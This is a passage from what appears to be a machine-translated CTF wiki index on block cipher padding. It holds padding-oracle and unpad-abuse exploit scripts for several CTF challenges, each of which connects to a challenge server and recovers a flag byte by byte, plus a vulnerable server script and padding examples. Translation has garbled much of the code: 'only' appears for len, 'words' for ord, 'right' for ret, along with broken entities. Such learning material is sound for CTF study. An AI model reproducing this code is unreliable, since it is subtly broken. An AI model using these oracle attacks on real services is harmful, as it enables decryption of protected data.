255-17+1 such multiple samples, however, if we do this, according to the number of times above 340 (255-17+1+57+56>340), we obviously can't Get all the bytes to the token. So here we need to find ways to reuse some content, here we choose to reuse the result of encrypt(md5(token[:i])) . Then we need to ensure that the number of times is sufficient on the one hand, and on the other hand, the previous results can be reused. Here we set the unpad loop to 17 to 208, and make the unpad more than 208 when we just unpad to where we can reuse. It should be noted here that when the last byte of md5(token[:i]) is 0, all decrypted plaintext unpad will be dropped, so the ciphertext of command not found will appear. Construct the ciphertext token_enc|padding|IV|encrypt(md5(token[:i])) again, then use the last byte of md5(token[:i]) for unpad when decrypting. If this byte is not less than 17 or 0, it can be processed. If this byte is less than 17, then obviously, the result of the last md5 returned to the user is not within the sample range, then we modify the highest bit of its last byte so that it can fall within the sample range after the unpad. In this way, we can guess the last byte of md5(token[:i]) . After guessing the last byte of md5(token[:i]) , we can brute 256 times locally and find out that all hashes are at the end of md5(token[:i]) The last byte of the character. However, in the sixth step, for a md5(token[:i]) we may find multiple alternative characters because we only need to make the last byte of the given byte. So, the question is, how do you delete some extra candidate strings? Here I chose a small trick, which enumerates the padding of the token at the same time as the byte-by-byte enumeration. Since padding is fixed at 0x01, we only need to filter out all tokens that are not 0x01 at the end. Here, the sleep in the code is commented out during the test. In order to speed up the interaction. Use the code as follows from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # remove pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) def sendmsg ( iv , cipher ): payload = iv + cipher payload = base64 . b64encode ( payload ) p . sendline ( payload ) def recvmsg (): data = p . recvuntil ( \" \\n \" , drop = True ) data = base64 . b64decode ( data ) return data [: 16 ], data [ 16 :] def getmd5enc ( i , cipher_token , cipher_welcome , iv ): \"\"\"return encrypt( md5( token[:i+1] ) )\"\"\" ## keep iv[7:] do not change, so decrypt msg[7:] won't change get_md5_iv = flipplain ( & quot ; token : & quot ; . lit ( 16 , & quot ; x00 & quot ;), & quot ; get - md5 & quot ; . 16 , ' \\x00 ' ), iv ) payload = cipher_token ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_token ) + 16 + 16 - ( 7 + i + 1 )), iv ) payload += last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , payload ) return recvmsg () def get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ): md5_token_idxi = [] for i in range ( len ( cipher_token ) - 7 ): log . info ( \"idx i: {} \" . format ( i )) _ , md5_indexi = getmd5enc ( i , cipher_token , cipher_welcome , iv_encrypt ) assert ( only ( md5_indexi ) == 32 ) # remove the last 16 byte for padding md5_token_idxi . append ( md5_indexi [: 16 ]) return md5_token_idxi def doin ( unpadcipher , md5map , candidates , flag ): if unpadcipher in md5map : lastbyte = md5map [ unpadcipher ] else : lastbyte = 0 if flag == 0 : lastbyte ^= 0x80 newcandidates = [] for x in candidates : for c in range ( 256 ): if MD5 . new ( x + chr ( c )) . digest ()[ - 1 ] == chr ( lastbyte ): newcandidates . append ( x + chr ( c )) candidates = newcandidates print candidates return candidates def main (): bypassproof () # result of encrypted Welcome!! iv_encrypt , cipher_welcome = recvmsg () log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-token get_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-token\" ), iv_encrypt ) sendmsg ( get_token_iv , cipher_welcome ) _ , cipher_token = recvmsg () token_len = only ( cipher_token ) log . info ( \"cipher token is : \" + cipher_token ) # get command not found cipher sendmsg ( iv_encrypt , cipher_welcome ) _ , cipher_notfound = recvmsg () # get encrypted(token[:i+1]),57 times md5_token_idx_list = get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ) # get md5map for each unpadsize, 209-17 times # when upadsize>208, it will unpad ciphertoken # then we can reuse md5map = dict () for unpadsize in range ( 17 , 209 ): log . info ( \"get unpad size {} cipher\" . format ( unpadsize )) get_md5_iv = flipplain ( & quot ; token : & quot ; . lit ( 16 , & quot ; x00 & quot ;), & quot ; get - md5 & quot ; . 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" ## calculate the proper last byte number, only change the last byte ## set last_byte_iv = iv_encrypted[:15] | proper byte last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"Welcome!!\" )[: 15 ] + chr ( unpadsize ), iv_encrypt ) cipher = cipher_token + padding + last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () md5map [ unpadcipher ] = unpadsize # reuse encrypted(token[:i+1]) for i in range ( 209 , 256 ): target = md5_token_idx_list [ 56 - ( i - 209 )] md5map [ target ] = i candidates = [ \"\" ] # get the byte token[i], only 56 byte for i in range ( token_len - 7 ): log . info ( \"get token[ {} ]\" . format ( i )) get_md5_iv = flipplain ( & quot ; token : & quot ; . lit ( 16 , & quot ; x00 & quot ;), & quot ; get - md5 & quot ; . 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" cipher = cipher_token + padding + iv_encrypt + md5_token_idx_list [ i ] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () # already in or md5[token[:i]][-1]='\\x00' if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 1 ) else : log . info ( & quot ; unpad size 1 - 16 & quot ;) # flip most significant bit of last byte to move it in a good range cipher = cipher [: - 17 ] + strxor ( cipher [ - 17 ], ' \\x80 ' ) + cipher [ - 16 :] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 0 ) else : log . info ( 'oh my god,,,, it must be in...' ) exit () print len ( candidates ) # padding 0x01 candidates = filter ( lambda x : x [ - 1 ] == chr ( 0x01 ), candidates ) # only 56 bytes candidates = [ x [: - 1 ] for x in candidates ] print len ( candidates ) assert ( len ( candidates [ 0 ]) == 56 ) # check-token check_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"check-token\" ), iv_encrypt ) sendmsg ( check_token_iv , cipher_welcome ) p . recvuntil ( \"Give me the token! \\n \" ) p . sendline ( base64 . b64encode ( candidates [ 0 ])) print p . recv () p . interactive () if __name__ == \"__main__\" : main () The effect is as follows ... 79 1 hitcon { uNp @ d_M3th0D_i5_am4Z1n9! }","title":"Using ideas"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#teaser-dragon-ctf-2018-aes-128-tsb","text":"This topic is still very interesting, the title is described as follows Haven't you ever thought that GCM mode is overcomplicated and there must be a simpler way to achieve Authenticated Encryption? Here it is! Server: aes-128-tsb.hackable.software 1337 server.py The attachment and the final exp are found by the ctf-challenge repository. The basic process of the topic is Continuously receive two strings a and b, where a is plaintext and b is ciphertext, note b needs to satisfy the tail just equal to iv after decryption. if a and b are equal, then a is gimme_flag and the encrypted flag is output. Otherwise, output a string of randomly encrypted strings. Otherwise output a string of plain text. In addition, we can also find that there is a problem with the unpad in the title, and the specified length can be truncated. def unpad ( msg ): if not msg : return '' return msg [: - ord ( msg [ - 1 ])] In the beginning, the very straightforward idea is to enter 0 for the lengths of a and b, then you can bypass the a==b check to get a string of random ciphertext encrypted strings. However, it does not seem to have any effect, let's analyze the encryption process. def tsb_encrypt ( aes , msg ): msg = pad ( msg ) iv = get_random_bytes ( 16 ) prev_pt = iv prev_ct = iv ct = '' for block in split_by ( msg , 16 ) + [ iv ]: ct_block = xor ( block , prev_pt ) ct_block = aes . encrypt ( ct_block ) ct_block = xor ( ct_block , prev_ct ) ct += ct_block prev_pt = block prev_ct = ct_block return iv + ct Let's assume that P_0=iv, C_0=iv P_0=iv, C_0=iv , then C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i) C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i) So, assuming the message length is 16, similar to the length of the gimme_flag padding we want to get, then $ C_1 = IV oplus E (IV oplus P_1) $ C_2=C_1 \\oplus E(P_1 \\oplus IV) C_2=C_1 \\oplus E(P_1 \\oplus IV) It is easy to find C_2=IV C_2=IV . ([Pirates] ( https://github.com/pberba/ctf-solutions/tree/master/20180929_teaser_dragon/aes_128_tsb ), the picture below is clearer Conversely, if we send iv+c+iv to the server, we can always bypass the tsb_decrypt mac check. def tsb_decrypt ( aes , msg ): iv , msg = msg [: 16 ], msg [ 16 :] prev_pt = iv prev_ct = iv pt = & #39;&#39; for block in split_by ( msg , 16 ): pt_block = xor ( block , prev_ct ) pt_block = aes . decrypt ( pt_block ) pt_block = xor ( pt_block , prev_pt ) pt += pt_block prev_pt = pt_block prev_ct = block pt , mac = pt [: - 16 ], pt [ - 16 :] if mac != iv : raise CryptoError () return unpad ( pt ) Then at this point, the message decrypted by the server is $ unpad (IV oplus D (C_1 oplus IV)) $","title":"Teaser Dragon CTF 2018 AES-128-TSB"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#get-the-last-byte-of-the-plaintext","text":"We can consider controlling the D decrypted message as a constant value, such as all zeros, ie C1=IV , then we can enumerate the last byte of the IV from 0 to 255, get $IV \\oplus D(C_1 \\oplus IV) The last byte of $ is also 0~255. Only when it is 1~15, after the unpad operation, the message length is not 0. Therefore, we can count which numbers cause the length to be non-zero and enumerate as 1 and the remaining flags to 0. def getlast_byte ( iv , block ): iv_pre = iv [: 15 ] iv_last = words ( iv [ - 1 ]) tmp = [] print ( 'get last byte' ) for i in range ( 256 ): send_data ( '' ) iv = iv_pre + chr ( i ) tmpblock = block [: 15 ] + chr ( i ^ ord ( block [ - 1 ]) ^ iv_last ) payload = iv + tmpblock + iv send_data ( payload ) length , data = recv_data () if 'Looks' in data : tmp . append ( 1 ) else : tmp . append ( 0 ) last_bytes = [] for i in range ( 256 ): if tmp == xor_byte_map [ i ][ 0 ]: last_bytes . append ( xor_byte_map [ i ][ 1 ]) print ( 'possible last byte is ' + str ( last_bytes )) return last_bytes In addition, we can get all the possible cases of the last byte at the beginning of the table, recorded in xor_byte_map. \"\"\" every item is a pair [a,b] a is the xor list b is the idx which is zero when xored \"\"\" xor_byte_map = [] for i in range ( 256 ): a = [] b = 0 for j in range ( 256 ): tmp = i ^ j if tmp > 0 and tmp <= 15 : a . append ( 1 ) else : a . append ( 0 ) if tmp == 0 : b = j xor_byte_map . append ([ a , b ]) By comparing this table, we can know what is possible with the last byte.","title":"Get the last byte of the plaintext"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#decrypt-any-encrypted-block","text":"After obtaining the last byte of the plaintext, we can use the unpad vulnerability to get the corresponding plaintext content from length 1 to length 15. def dec_block ( iv , block ): last_bytes = getlast_byte ( iv , block ) iv_pre = iv [: 15 ] iv_last = words ( iv [ - 1 ]) print ( 'try to get plain' ) plain0 = & #39;&#39; for last_byte in last_bytes : plain0 = & #39;&#39; for i in range ( 15 ): print 'idx:' , i tag = false for j in range ( 256 ): send_data ( plain0 + chr ( j )) pad_size = 15 - i iv = iv_pre + chr ( pad_size ^ last_byte ) tmpblock = block [: 15 ] + chr ( pad_size ^ last_byte ^ ord ( block [ - 1 ]) ^ iv_last ) payload = iv + tmpblock + iv send_data ( payload ) length , data = recv_data () if 'Looks' not in data : # success plain0 + = chr ( j ) tag = True break if not tag : break # means the last byte is ok if plain0 != '' : break plain0 += chr ( iv_last ^ last_byte ) return plain0","title":"Decrypt any encrypted block"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#decrypt-the-specified-plaintext","text":"This is relatively simple, we hope to use this to get the ciphertext of gimme_flag print ( 'get the cipher of flag' ) gemmi_iv1 = xor ( pad ( 'gimme_flag' ), plain0 ) gemmi_c1 = xor ( gemmi_iv1 , cipher0 ) payload = gemmi_iv1 + gemmi_c1 + gemmi_iv1 send_data ( 'gimme_flag' ) send_data ( payload ) flag_len , flag_cipher = recv_data () Where plain0 and cipher0 are the clear ciphertext pairs we obtained for AES encryption, excluding the two exclusive ORs before and after.","title":"Decrypt the specified plaintext"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#decrypt-flag","text":"This point is actually achieved by the function of decrypting any encrypted block, as follows print ( 'the flag cipher is ' + flag_cipher . encode ( 'hex' )) flag_cipher = split_by ( flag_cipher , 16 ) print ( 'decrypt the blocks one by one' ) plain = '' for i in range ( len ( flag_cipher ) - 1 ): print ( 'block: ' + str ( i )) if i == 0 : plain += dec_block ( flag_cipher [ i ], flag_cipher [ i + 1 ]) else : iv = plain [ - 16 :] cipher = xor ( xor ( iv , flag_cipher [ i + 1 ]), flag_cipher [ i ]) plain += dec_block ( iv , cipher ) pass print ( 'now plain: ' + plain ) print plain Think about why the ciphertext operation after the second block will be different. The complete code references the ctf-challenge repository.","title":"Decrypt flag"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#references","text":"[Packet Encryption Mode] ( https://en.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5 % E4%BD%9C%E6%A8%A1%E5%BC%8F) https://en.wikipedia.org/wiki/Padding_oracle_attack http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf https://ctftime.org/writeup/7975 https://ctftime.org/writeup/7974","title":"References"},{"location":"crypto/blockcipher/mode/padding/","text":"Fill rule \u00b6 As we said before, in packet encryption, the length of the plaintext often does not meet the requirements, and padding is required. How to padding has a lot of rules. The common [fill rule] ( https://www.di-mgt.com.au/cryptopad.html ) is as follows. It should be noted that even if the length of the message is an integer multiple of the block size, it still needs to be filled. In general, if Padding is found to be incorrect after decryption, an exception is often thrown. We can therefore know if Paddig is correct. Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding) \u00b6 Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 05 05 05 05 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40 Pad with 0x80 followed by zero bytes (OneAndZeroes Padding) \u00b6 Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 80 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40 This is actually the same as the padding of md5 and sha1. Pad with zeroes except make the last byte equal to the number of padding bytes \u00b6 Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8 Pad with zero (null) characters \u00b6 Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75 Pad with spaces \u00b6 Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 20 20 20 20 20 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25 2018 Shanghai University Student Network Security Competition aessss \u00b6 Sometimes you can attack some improperly used Padding. Here is a topic of the 2018 Shanghai University Student Network Security Competition: The title script is as follows: import random import sys import string from hashlib import sha256 import SocketServer from Crypto.Cipher import AES from secret import FLAG , IV , KEY class Task ( SocketServer . BaseRequestHandler ): def proof_of_work ( self ): proof = '' . join ( [ random . choice ( string . ascii_letters + string . digits ) for _ in xrange ( 20 )]) # print proof digest = sha256 ( proof ) . hexdigest () self . request . send ( \"sha256(XXXX+ %s ) == %s \\n \" % ( proof [ 4 :], digest )) self . request . send ( 'Give me XXXX:' ) x = self . request . recv ( 10 ) x = x . strip () if len ( x ) != 4 or sha256 ( x + proof [ 4 :]) . hexdigest () != digest : return False return True def pad ( self , s ): s + = ( 256 - only ( s )) * chr ( 256 - only ( s )) ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . s_box ): ret [ pos ] = s [ index ] return '' . join ( ret ) def unpad ( self , s ): ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . invs_box ): ret [ pos ] = s [ index ] return & #39;&#39; .join (right [0: -word (right [-1])]) s_box = [ 0x63 , 0x7C , 0x77 , 0x7B , 0xF2 , 0x6B , 0x6F , 0xC5 , 0x30 , 0x01 , 0x67 , 0x2B , 0xFE , 0xD7 , 0xAB , 0x76 , 0xCA , 0x82 , 0xC9 , 0x7D , 0xFA , 0x59 , 0x47 , 0xF0 , 0xAD , 0xD4 , 0xA2 , 0xAF , 0x9C , 0xA4 , 0x72 , 0xC0 , 0xB7 , 0xFD , 0x93 , 0x26 , 0x36 , 0x3F , 0xF7 , 0xCC , 0x34 , 0xA5 , 0xE5 , 0xF1 , 0x71 , 0xD8 , 0x31 , 0x15 , 0x04 , 0xC7 , 0x23 , 0xC3 , 0x18 , 0x96 , 0x05 , 0x9A , 0x07 , 0x12 , 0x80 , 0xE2 , 0xEB , 0x27 , 0xB2 , 0x75 , 0x09 , 0x83 , 0x2C , 0x1A , 0x1B , 0x6E , 0x5A , 0xA0 , 0x52 , 0x3B , 0xD6 , 0xB3 , 0x29 , 0xE3 , 0x2F , 0x84 , 0x53 , 0xD1 , 0x00 , 0xED , 0x20 , 0xFC , 0xB1 , 0x5B , 0x6A , 0xCB , 0xBE , 0x39 , 0x4A , 0x4C , 0x58 , 0xCF , 0xD0 , 0xEF , 0xAA , 0xFB , 0x43 , 0x4D , 0x33 , 0x85 , 0x45 , 0xF9 , 0x02 , 0x7F , 0x50 , 0x3C , 0x9F , 0xA8 , 0x51 , 0xA3 , 0x40 , 0x8F , 0x92 , 0x9D , 0x38 , 0xF5 , 0xBC , 0xB6 , 0xDA , 0x21 , 0x10 , 0xFF , 0xF3 , 0xD2 , 0xCD , 0x0C , 0x13 , 0xEC , 0x5F , 0x97 , 0x44 , 0x17 , 0xC4 , 0xA7 , 0x7E , 0x3D , 0x64 , 0x5D , 0x19 , 0x73 , 0x60 , 0x81 , 0x4F , 0xDC , 0x22 , 0x2A , 0x90 , 0x88 , 0x46 , 0xEE , 0xB8 , 0x14 , 0xDE , 0x5E , 0x0B , 0xDB , 0xE0 , 0x32 , 0x3A , 0x0A , 0x49 , 0x06 , 0x24 , 0x5C , 0xC2 , 0xD3 , 0xAC , 0x62 , 0x91 , 0x95 , 0xE4 , 0x79 , 0xE7 , 0xC8 , 0x37 , 0x6D , 0x8D , 0xD5 , 0x4E , 0xA9 , 0x6C , 0x56 , 0xF4 , 0xEA , 0x65 , 0x7A , 0xAE , 0x08 , 0xBA , 0x78 , 0x25 , 0x2E , 0x1C , 0xA6 , 0xB4 , 0xC6 , 0xE8 , 0xDD , 0x74 , 0x1F , 0x4B , 0xBD , 0x8B , 0x8A , 0x70 , 0x3E , 0xB5 , 0x66 , 0x48 , 0x03 , 0xF6 , 0x0E , 0x61 , 0x35 , 0x57 , 0xB9 , 0x86 , 0xC1 , 0x1D , 0x9E , 0xE1 , 0xF8 , 0x98 , 0x11 , 0x69 , 0xD9 , 0x8E , 0x94 , 0x9B , 0x1E , 0x87 , 0xE9 , 0xCE , 0x55 , 0x28 , 0xDF , 0x8C , 0xA1 , 0x89 , 0x0D , 0xBF , 0xE6 , 0x42 , 0x68 , 0x41 , 0x99 , 0x2D , 0x0F , 0xB0 , 0x54 , 0xBB , 0x16 ] invs_box = [ 0x52 , 0x09 , 0x6A , 0xD5 , 0x30 , 0x36 , 0xA5 , 0x38 , 0xBF , 0x40 , 0xA3 , 0x9E , 0x81 , 0xF3 , 0xD7 , 0xFB , 0x7C , 0xE3 , 0x39 , 0x82 , 0x9B , 0x2F , 0xFF , 0x87 , 0x34 , 0x8E , 0x43 , 0x44 , 0xC4 , 0xDE , 0xE9 , 0xCB , 0x54 , 0x7B , 0x94 , 0x32 , 0xA6 , 0xC2 , 0x23 , 0x3D , 0xEE , 0x4C , 0x95 , 0x0B , 0x42 , 0xFA , 0xC3 , 0x4E , 0x08 , 0x2E , 0xA1 , 0x66 , 0x28 , 0xD9 , 0x24 , 0xB2 , 0x76 , 0x5B , 0xA2 , 0x49 , 0x6D , 0x8B , 0xD1 , 0x25 , 0x72 , 0xF8 , 0xF6 , 0x64 , 0x86 , 0x68 , 0x98 , 0x16 , 0xD4 , 0xA4 , 0x5C , 0xCC , 0x5D , 0x65 , 0xB6 , 0x92 , 0x6C , 0x70 , 0x48 , 0x50 , 0xFD , 0xED , 0xB9 , 0xDA , 0x5E , 0x15 , 0x46 , 0x57 , 0xA7 , 0x8D , 0x9D , 0x84 , 0x90 , 0xD8 , 0xAB , 0x00 , 0x8C , 0xBC , 0xD3 , 0x0A , 0xF7 , 0xE4 , 0x58 , 0x05 , 0xB8 , 0xB3 , 0x45 , 0x06 , 0xD0 , 0x2C , 0x1E , 0x8F , 0xCA , 0x3F , 0x0F , 0x02 , 0xC1 , 0xAF , 0xBD , 0x03 , 0x01 , 0x13 , 0x8A , 0x6B , 0x3A , 0x91 , 0x11 , 0x41 , 0x4F , 0x67 , 0xDC , 0xEA , 0x97 , 0xF2 , 0xCF , 0xCE , 0xF0 , 0xB4 , 0xE6 , 0x73 , 0x96 , 0xAC , 0x74 , 0x22 , 0xE7 , 0xAD , 0x35 , 0x85 , 0xE2 , 0xF9 , 0x37 , 0xE8 , 0x1C , 0x75 , 0xDF , 0x6E , 0x47 , 0xF1 , 0x1A , 0x71 , 0x1D , 0x29 , 0xC5 , 0x89 , 0x6F , 0xB7 , 0x62 , 0x0E , 0xAA , 0x18 , 0xBE , 0x1B , 0xFC , 0x56 , 0x3E , 0x4B , 0xC6 , 0xD2 , 0x79 , 0x20 , 0x9A , 0xDB , 0xC0 , 0xFE , 0x78 , 0xCD , 0x5A , 0xF4 , 0x1F , 0xDD , 0xA8 , 0x33 , 0x88 , 0x07 , 0xC7 , 0x31 , 0xB1 , 0x12 , 0x10 , 0x59 , 0x27 , 0x80 , 0xEC , 0x5F , 0x60 , 0x51 , 0x7F , 0xA9 , 0x19 , 0xB5 , 0x4A , 0x0D , 0x2D , 0xE5 , 0x7A , 0x9F , 0x93 , 0xC9 , 0x9C , 0xEF , 0xA0 , 0xE0 , 0x3B , 0x4D , 0xAE , 0x2A , 0xF5 , 0xB0 , 0xC8 , 0xEB , 0xBB , 0x3C , 0x83 , 0x53 , 0x99 , 0x61 , 0x17 , 0x2B , 0x04 , 0x7E , 0xBA , 0x77 , 0xD6 , 0x26 , 0xE1 , 0x69 , 0x14 , 0x63 , 0x55 , 0x21 , 0x0C , 0x7D ] def encrypt ( self , msg ): cipher = AES . new ( KEY , AES . MODE_CBC , IV ) return cipher . encrypt ( msg ) . encode ( 'hex' ) def handle ( self ): if not self . proof_of_work (): return self . request . settimeout ( 15 ) req = self . request flag_len = len ( FLAG ) assert ( flag_len == 33 ) self . flag = self . pad ( FLAG ) assert ( len ( self . flag ) == 256 ) while True : req . sendall ( 'Welcome to AES(WXH) encrypt system. \\n 1. get encrypted flag. \\n 2. pad flag. \\n 3.Do some encrypt. \\n Your choice:' ) cmd = req . recv ( 2 ) . strip () try : cmd = int ( cmd ) except ValueError : cmd = 0 if cmd == 1 : enc = self . encrypt ( self . flag ) req . sendall ( 'Here is the encrypted flag: 0x %s \\n ' % enc ) elif cmd == 2 : req . sendall ( 'Pad me something:' ) self . flag = self . unpad ( self . flag ) [ : flag_len ] + req . recv ( 1024 ) . strip () assert ( len ( self . flag ) <= 256 ) self . flag = self . pad ( self . flag ) req . sendall ( 'Done. \\n ' ) elif cmd == 3 : req . sendall ( 'What do you want to encrypt:' ) msg = self . pad ( req . recv ( 1024 ) . strip ()) assert ( len ( msg ) & lt ; = 256 ) enc = self . encrypt ( msg ) req . sendall ( 'Here is the encrypted message: 0x %s \\n ' % enc ) else : req . sendall ( 'Do not lose heart\uff5e \uff01% Once WXH AK IOI 2019 can Solved! WXH is the first in the tianxia!' ) req . close () return class ThreadedServer ( SocketServer . ThreadingMixIn , SocketServer . TCPServer ): pass if __name__ == \"__main__\" : HOST , PORT = '0.0.0.0' , 23333 print 'Run in port:23333' server = ThreadedServer (( HOST , PORT ), Task ) server . allow_reuse_address = True server . serve_forever () Analysis \u00b6 The problem with this problem is in padding. Since there are less than 256 bits to padding, the padding bytes are the missing bytes, but if the plaintext is 256 bytes, then padding is not performed according to the code logic: def pad ( self , s ): s + = ( 256 - only ( s )) * chr ( 256 - only ( s )) ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . s_box ): ret [ pos ] = s [ index ] return '' . join ( ret ) The biggest problem is on the unpad, which is not checked by the unpad, only the last byte is used to determine the number of bytes to fill. def unpad ( self , s ): ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . invs_box ): ret [ pos ] = s [ index ] return & #39;&#39; .join (right [0: -word (right [-1])]) We can control the number of padding bytes removed by tampering with the last byte. Use \u00b6 Select choice2 and append 256-33 = 223 bytes so that the current flag does not need to be filled. The last byte appended is set to chr(256-32) . The server appends our information to the flag and performs s box substitution, and the result is assigned to the flag variable in the class. We choose choice2 again, here we need to append, the server will take the flag variable in the class for reverse S box replacement and unpad, so according to this unpad algorithm will be the next 224 bytes as the padding removed, the plaintext is left The first 32 bits of the real flag. We enter a character i at this time, then the object encrypted at this time is flag[:32]+i . Select choice1 to encrypt the current flag, control i to blast, and if the resulting ciphertext is the same as the original flag encrypted ciphertext, the last byte of the flag is obtained. Bleak byte by byte until all flags are obtained. Exp is as follows: # -*- coding: utf-8 -*- from hashlib import sha256 import socket import string import itertools HOST = '106.75.13.64' PORT = 54321 sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( HOST , PORT )) def brute_force ( pad , shavalue ): for str in itertools . product ( string . ascii_letters + string . digits , repeat = 4 ): str = '' . join ( str ) if sha256 ( str + pad ) . hexdigest () == shavalue : print str return str def choice1 (): sock . send ( \"1 \\n \" ) result = sock . recv ( 1024 ) . strip ()[ 30 :] sock . recv ( 1024 ) . strip () return result def choice2 ( pad ): sock . send ( \"2 \\n \" ) sock . recv ( 1024 ) . strip () sock . send ( pad + \" \\n \" ) sock . recv ( 1024 ) . strip () sock . recv ( 1024 ) . strip () def choice3 ( str ): sock . send ( \"3 \\n \" ) sock . recv ( 1024 ) . strip () sock . send ( str + \" \\n \" ) result = sock . recv ( 1024 ) . strip ()[ 33 :] sock . recv ( 1024 ) . strip () return result content = sock . recv ( 1024 ) . strip () pad = content [ 12 : 12 + 16 ] hash = content [ 33 : 33 + 64 ] sock . recv ( 1024 ) . strip () sock . send ( str ( brute_force ( pad , hash )) + \" \\n \" ) print sock . recv ( 1024 ) . strip () flag_enc = choice1 () flag = \"\" for i in range ( 33 ): a = '' . join ([ 'a' for _ in range ( 223 )]) a = a [: - 1 ] + chr ( 224 + i ) for c in string . printable : print c + flag choice2 ( a ) choice2 ( c + flag ) if choice1 () == flag_enc : flag = c + flag print \"success:\" , flag break flag{H4ve_fun_w1th_p4d_and_unp4d}","title":"Padding Methods"},{"location":"crypto/blockcipher/mode/padding/#fill-rule","text":"As we said before, in packet encryption, the length of the plaintext often does not meet the requirements, and padding is required. How to padding has a lot of rules. The common [fill rule] ( https://www.di-mgt.com.au/cryptopad.html ) is as follows. It should be noted that even if the length of the message is an integer multiple of the block size, it still needs to be filled. In general, if Padding is found to be incorrect after decryption, an exception is often thrown. We can therefore know if Paddig is correct.","title":"Fill rule"},{"location":"crypto/blockcipher/mode/padding/#pad-with-bytes-all-of-the-same-value-as-the-number-of-padding-bytes-pkcs5-padding","text":"Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 05 05 05 05 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40","title":"Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)"},{"location":"crypto/blockcipher/mode/padding/#pad-with-0x80-followed-by-zero-bytes-oneandzeroes-padding","text":"Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 80 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40 This is actually the same as the padding of md5 and sha1.","title":"Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)"},{"location":"crypto/blockcipher/mode/padding/#pad-with-zeroes-except-make-the-last-byte-equal-to-the-number-of-padding-bytes","text":"Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8","title":"Pad with zeroes except make the last byte equal to the number of padding bytes"},{"location":"crypto/blockcipher/mode/padding/#pad-with-zero-null-characters","text":"Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 